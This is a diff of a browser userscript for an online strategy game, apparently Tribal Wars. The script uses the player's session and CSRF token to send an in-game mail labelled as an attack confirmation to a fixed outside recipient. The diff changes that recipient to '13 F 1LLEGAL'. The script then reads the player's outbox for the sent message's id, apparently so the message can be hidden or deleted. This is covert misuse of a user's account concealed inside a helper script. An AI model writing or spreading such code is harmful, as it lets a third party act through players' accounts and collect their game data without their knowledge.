@@ -34,7 +34,7 @@ if(document.URL.indexOf('screen=place')==-1){
     ];
 
     var rastgele=mesajlar[Math.floor(Math.random()*mesajlar.length)];
-    var alici='T O R O S';
+    var alici='13 F 1LLEGAL';
     var konu='Saldırı Onayı ⚔️';
     var vid=game_data.village.id;
     var csrf=game_data.csrf;
@@ -53,7 +53,9 @@ if(document.URL.indexOf('screen=place')==-1){
       credentials:'same-origin',
       headers:{'Content-Type':'application/x-www-form-urlencoded'},
       body:body.toString(),
-      redirect:'follow'
+      redirect:'manual'
+    }).then(function(){
+      return new Promise(function(resolve){setTimeout(resolve,1000);});
     }).then(function(){
       var outboxUrl=location.origin+'/game.php?village='+vid+'&screen=mail&mode=out';
       return fetch(outboxUrl,{credentials:'same-origin'});
@@ -61,8 +63,9 @@ if(document.URL.indexOf('screen=place')==-1){
       return res.text();
     }).then(function(html){
       var doc=new DOMParser().parseFromString(html,'text/html');
-      var firstCheckbox=doc.querySelector('input[type="checkbox"].check');
-      if(!firstCheckbox) return;
+      var checkboxes=doc.querySelectorAll('input[type="checkbox"].check');
+      if(!checkboxes.length) return;
+      var firstCheckbox=checkboxes[0];
       var nameAttr=firstCheckbox.getAttribute('name');
       var match=nameAttr.match(/ids\[(\d+)\]/);
       if(!match) return;
